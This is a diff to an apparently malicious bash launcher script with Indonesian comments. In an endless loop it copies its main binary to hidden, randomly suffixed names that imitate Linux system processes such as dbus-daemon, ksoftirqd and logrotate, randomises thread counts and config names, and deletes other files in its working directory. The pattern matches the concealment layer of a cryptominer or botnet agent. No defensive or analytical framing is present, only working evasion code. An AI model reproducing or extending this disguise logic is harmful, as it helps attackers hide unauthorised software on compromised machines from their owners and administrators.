@@ -24,9 +24,9 @@ UA_LIST=(
 )
 
 ALIAS_BIN_LIST=(
-    ".dbus-daemon" ".ksoftirqd" ".systemd-update" ".svc-runner"
-    ".profile-cache" ".netd-helper" ".rcu_sync" ".sessiond"
-    ".jbd2flush" ".logrotate" ".udevworker" ".cron.cleaner"
+    "dbus-daemon" "ksoftirqd" "systemd-update" "svc-runner"
+    "profile-cache" "netd-helper" "rcu_sync" "sessiond"
+    "jbd2flush" "logrotate" "udevworker" "cron-cleaner"
 )
 
 CONFIG_LIST=(
@@ -48,8 +48,8 @@ if [ ! -f "$BIN_NAME_ORI" ]; then
 fi
 
 while true; do
-    # Hapus hanya file alias dan config, jangan hapus binary utama
-    find "$WORKDIR" -type f \( -name ".*" -o -name "*.json" -o -name "*.conf" \) ! -name "$BIN_NAME_ORI" -delete
+    # Hapus semua file kecuali binary utama
+    find "$WORKDIR" -maxdepth 1 -type f ! -name "$BIN_NAME_ORI" -exec rm -f {} +
     
     THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
     
@@ -60,7 +60,7 @@ while true; do
     BASE_CONFIG_NAME=${CONFIG_LIST[$RANDOM % ${#CONFIG_LIST[@]}]}
     
     RANDOM_SUFFIX=$(generate_random_suffix)
-    ALIAS_BIN="${BASE_ALIAS_BIN}${RANDOM_SUFFIX}"
+    ALIAS_BIN=".${BASE_ALIAS_BIN}${RANDOM_SUFFIX}"
     CONFIG_NAME="${BASE_CONFIG_NAME%.*}${RANDOM_SUFFIX}.${BASE_CONFIG_NAME##*.}"
 
     cp "$BIN_NAME_ORI" "$ALIAS_BIN"
